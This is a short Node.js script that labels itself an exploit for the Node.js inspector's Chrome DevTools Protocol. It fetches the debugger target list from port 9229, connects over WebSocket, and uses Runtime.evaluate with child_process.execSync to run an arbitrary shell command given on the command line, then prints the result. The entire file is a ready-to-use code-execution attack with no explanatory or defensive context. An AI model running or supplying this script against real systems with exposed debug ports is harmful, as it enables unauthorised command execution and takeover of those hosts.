// cdp.js - Chrome DevTools Protocol exploit for Node.js inspector
// Usage: node cdp.js "command"

const WebSocket = require('ws');
const http = require('http');

const command = process.argv[2] || 'id';

http.get('http://127.0.0.1:9229/json/list', (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
        const targets = JSON.parse(data);
        const wsUrl = targets[0].webSocketDebuggerUrl;
        const ws = new WebSocket(wsUrl);

        ws.on('open', () => {
            ws.send(JSON.stringify({
                id: 1,
                method: 'Runtime.evaluate',
                params: { expression: `require('child_process').execSync('${command}').toString()` }
            }));
        });

        ws.on('message', (msg) => {
            const response = JSON.parse(msg);
            if (response.result && response.result.result) {
                console.log(response.result.result.value);
            }
            ws.close();
        });
    });
});
